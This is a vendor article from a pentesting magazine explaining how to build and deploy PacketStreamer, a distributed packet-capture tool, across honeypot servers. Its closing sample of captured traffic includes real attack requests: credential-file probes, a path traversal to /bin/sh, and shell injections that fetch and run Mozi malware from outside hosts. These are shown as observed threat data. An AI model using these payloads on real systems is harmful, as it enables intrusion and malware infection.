---
title: Wide-area Packet Capture with PacketStreamer
url: https://pentestmag.com/wide-area-packet-capture-with-packetstreamer/?utm_source=rss&utm_medium=rss&utm_campaign=wide-area-packet-capture-with-packetstreamer
source: Pentestmag
date: 2023-02-21
fetch_date: 2025-10-04T07:39:30.093852
---

# Wide-area Packet Capture with PacketStreamer

[*0*](https://pentestmag.com/cart/)

* [Home](https://pentestmag.com/)
* [Courses](https://pentestmag.com/courses/)
* [eBooks](https://pentestmag.com/magazines/)
* [Subscription](https://pentestmag.com/levels-page/)
* [Blog](https://pentestmag.com/category/news/)
* [Contact Us](https://pentestmag.com/contact-us/)
* [About Us](https://pentestmag.com/about/)
* [Shop](https://pentestmag.com/shop/)

## [![Pentestmag](https://pentestmag.com/wp-content/uploads/2023/06/PenTeswhitet.svg)![Pentestmag](https://pentestmag.com/wp-content/uploads/2023/06/PenTeswhitet.svg)](https://pentestmag.com/)

* **Products**
  + [Online Courses](https://pentestmag.com/courses/)
  + [eBooks](https://pentestmag.com/magazines/)
  + [Shop](https://pentestmag.com/shop/)
* [**Subscription**](https://pentestmag.com/levels-page/)
* [**Corporate**](https://pentestmag.com/corporate-access/)
* [**Education**](https://pentestmag.com/edu/)

* No products in the cart.
* [LOGIN / SIGN UP](#login)

Login
Login with facebook
Login
Login with google

### LOGIN

[Forgot Password](https://pentestmag.com/wp-login.php?action=lostpassword "Forgot Password")

[ ] Remember Me

* [Sign Up](https://pentestmag.com/signup/ "Create an account")

Login
Login with facebook
Login
Login with google

* [Home](https://pentestmag.com)
* [Official](https://pentestmag.com/category/official/)
* Wide-area Packet Capture with PacketStreamer

# Wide-area Packet Capture with PacketStreamer

Feb 20, 2023

![](https://pentestmag.com/wp-content/uploads/2023/02/image1-2.png)

*by Owen Garrett, Deepfence*

**PacketStreamer is an open source project from Deepfence.  It performs distributed packet capture (tcpdump-like) and aggregates the pcap data in a single pcap file.  PacketStreamer supports a wide range of environments, including Kubernetes nodes, Docker hosts, Fargate instances and, of course, virtual and bare-metal servers.![](https://pentestmag.com/wp-content/uploads/2023/02/image1-2.png)**

Network packet capture is a well understood practice. The basic technology that modern tools are built on first appeared in a tool named ‘tcpdump’, released in 1988, and the associated file format (pcap) has stood the test of time.

Although the technology has changed little, modern compute environments are very different from the single-Unix-server assumptions that defined the design of tcpdump.  Modern environments are cloud-based, distributed across many servers, and use virtualization technologies that make it difficult to run kernel tools such as tcpdump directly.

PacketStreamer applies contemporary network capture to modern, cloud-native environments. It captures traffic from large numbers of remote servers (for example, cloud nodes) and collects that traffic in one place. It supports modern stacks, such as Kubernetes (via a daemonset), Docker, and AWS Fargate, as well as standard hosts.

Use PacketStreamer if you need a lightweight, efficient method to collect raw network data from multiple machines for central logging and analysis:

* **Debugging**: intermittent errors are happening and your log files don’t reveal enough details. You need to gather network traffic to see what requests your servers are processing.
* **Forensics**: you want to capture traffic to sensitive services for storage and later inspection in the event of an investigation.
* **Threat hunting**: you want to identify any unusual behavior that may indicate the presence of adversaries.
* **Machine learning**: you need to capture large volumes of network traffic from many production servers to train machine learning engines to recognize normal and anomalous traffic.

## **Getting Started with PacketStreamer**

We’ll share a walkthrough of building, installing and running PacketStreamer, and see what we find.

We’ll start with four cloud servers.  Three are honeypot servers, running WordPress, a simple NGINX hello-world, and honeydb.io.  The fourth will be our receiver server where we aggregate and analyze the packet data.

### **Build PacketStreamer**

On the build (receiver) server, let’s clone the source and build PacketStreamer.  It’s a standalone Golang app, and we’ll statically-link the build to make it as portable as possible:

```
# install the necessary build tools (Debian/Ubuntu; other OSs will differ)

sudo apt install -y build-essential golang-go libpcap-dev

# Get the source (github) and build a statically-linked binary

git clone https://github.com/deepfence/PacketStreamer.git

cd PacketStreamer/

make STATIC=1

# verify we have a statically-linked binary

file packetstreamer

packetstreamer: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, not stripped
```

### **Deploy the receiver**

In one terminal on the receiver server, let’s start the PacketStreamer receiver process and pipe the pcap output into tshark.  We can use the included **receiver-stdout.yaml** configuration file, which configures the receiver to accept traffic on port 8081:

```
./packetstreamer receiver \
   --config ./contrib/config/receiver-stdout.yaml | tshark -r - -Y http
```

The PacketStreamer receiver process will run quietly, waiting for connections from remote PacketStreamer sensors.  Pcap output from PacketStreamer will be piped to the **tshark** tool.

You could instead write the output to a file for later analysis, or even tee it to a file while watching using tshark. That way, you can quickly spot anomalies (tshark output) and investigate the full packet dump.

### **Deploy the sensors**

Now, let’s deploy the sensors on each of our target servers.  We first need to create a simple configuration file **sensor-remote.yaml** that identifies the location of the remote receiver:

```
output:
  server:
     address: 12.34.56.78
     port: 8081
pcapMode: all
```

Copy the **PacketStreamer** binary and the **sensor-remote.yaml** configuration file to each of the target servers:

```
scp packetstreamer sensor-remote.yaml user@wordpress:/tmp
```

Then run the sensors on the remote machines:

```
ssh root@wordpress

/tmp/packetstreamer sensor --config /tmp/sensor-remote.yaml
```

Repeat for the nginx and honeypot machines.

### **Analyzing the results**

We ran the sensors and receivers for 24 hours, looking for interesting HTTP requests (**tshark -Y http**) to the target servers.  We saw hundreds of drive-by attempts from dozens of different PI addresses, trying to find unprotected secrets, find vulnerable control panel components, use injection to install malware, etc.

Requests ranged from an innocuous-looking ‘GET <https://example.com/>’, to much more significant attempts; a small selection of the captured traffic is listed below (IP addresses obfuscated):

HTTP 295 GET /.env HTTP/1.1

HTTP 307 GET /.aws/credentials HTTP/1.1

HTTP 86 POST /.aws/credentials HTTP/1.1  (application/x-www-form-urlencoded)

HTTP 599 POST /boaform/admin/formLogin HTTP/1.1  (application/x-www-form-urlencoded)

HTTP 335 GET /\_ignition/execute-solution HTTP/1.1

HTTP 292 GET //robots.txt HTTP/1.1

HTTP 306 GET //.well-known/security.txt HTTP/1.1

HTTP 293 GET //sitemap.xml HTTP/1.1

HTTP 176 GET https://example.com/ HTTP/1.1

HTTP 796 GET /Rh-aD.nSuH\_ HTTP/1.1

HTTP 941 GET /yTHlRfsRgMPOmMR2kd4Hc765I/mC/mqqE3ohONMZfZP0WUJFGFSGhlX/j1?KAwuc=ymn5Jdu96Iip\_MOYa9.dTr3U7Yc&wpaCkwFkjcIU=0llrN&E0LYUK=cn.X2DT4AKByeQVWUK-gOED5Vk HTTP/1.1

HTTP 416 POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1  (application/x-www-form-urlencoded)

HTTP 86 POST /assets/images/get.php HTTP/1.1  (application/x-www-form-urlencoded)

HTTP 573 GET /dup-installer/main.installer.php HTTP/1.1

HTTP 296 GET /shell?cd+/tmp;rm+-rf+\*;wget+23.94.50.19/jaws;sh+/tmp/jaws HTTP/1.1

HTTP 302 GET /actuator/gateway/routes HTTP/1.1

HTTP 336 GET /shell?cd+/tmp;rm+-rf+\*;wget+https://13.25.90.45:34416/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1

HTTP 302 GET /.git/config HTTP/1.1

HTTP 86 POST /assets/images/go.php HTTP/1.1  (application/x-www-form-urlencoded)

HTTP 378 GET /vend...